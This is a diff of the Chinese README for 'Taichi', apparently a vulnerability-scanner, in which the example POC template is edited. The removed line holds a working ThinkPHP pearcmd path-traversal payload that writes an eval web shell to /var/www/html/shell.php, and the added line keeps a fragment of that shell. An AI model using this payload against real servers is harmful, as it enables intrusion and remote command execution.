@@ -1,6 +1,5 @@
 # Taichi
 
-
 # 历史更新
 
 **2023.3.24**
@@ -209,7 +208,7 @@ response包里的关键字，目前只能写一个，根据burp的poc填写
 ```
 #poc名称
 - name:
-  - name: "thinkphp_rce"
+  - name: "test"
 
 #请求方式
 - method:
@@ -221,7 +220,7 @@ response包里的关键字，目前只能写一个，根据burp的poc填写
 
 #payload
 - payload:
-  - payload: "lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_REQUEST['cmd']);?>+/var/www/html/shell.php"
+  - payload: "@eval($_REQUEST['cmd']);?>/var/www/html/shell.php"
 
 #response包里状态码
 - status:
